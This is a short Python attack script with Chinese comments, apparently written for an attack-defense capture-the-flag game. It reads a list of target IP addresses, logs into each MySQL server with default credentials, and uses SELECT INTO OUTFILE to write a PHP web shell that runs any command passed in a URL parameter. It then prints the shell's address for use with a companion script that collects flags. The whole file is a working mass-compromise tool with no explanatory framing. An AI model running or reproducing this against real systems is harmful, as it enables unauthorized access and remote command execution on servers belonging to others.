import mysql.connector
#这个脚本是使用默认口令登录数据库写入shell并回显路径的，需要结合shell.py来批量连接和获取flag
# 从文本文件中读取IP地址
def read_targets_from_file(file_path):
    with open(file_path, "r") as f:
        return [line.strip() for line in f.readlines()]

# 数据库登录凭据
db_username = "default_username"
db_password = "default_password"
db_name = "default_database_name"

# Webshell内容及上传路径
webshell_content = "<?php system($_GET['cmd']); ?>"
webshell_upload_path = "/var/www/html/webshell.php"

# 创建Webshell的SQL查询
query = f"SELECT '{webshell_content}' INTO OUTFILE '{webshell_upload_path}'"

# 将Webshell写入目标服务器的函数
def upload_webshell(target):
    try:
        # 连接到MySQL数据库
        cnx = mysql.connector.connect(
            host=target,
            user=db_username,
            password=db_password,
            database=db_name,
            connect_timeout=5
        )

        # 执行SQL查询以创建Webshell
        cursor = cnx.cursor()
        cursor.execute(query)
        
        # 输出成功写入的shell路径
        print(f"Webshell uploaded on {target}: http://{target}{webshell_upload_path}")

        # 关闭数据库连接
        cursor.close()
        cnx.close()
    except Exception as e:
        print(f"Error uploading Webshell on {target}: {e}")

# 将目标列表从文本文件中读取
targets_file = "ips.txt"
targets = read_targets_from_file(targets_file)

# 遍历目标列表并上传Webshell
for target in targets:
    upload_webshell(target)
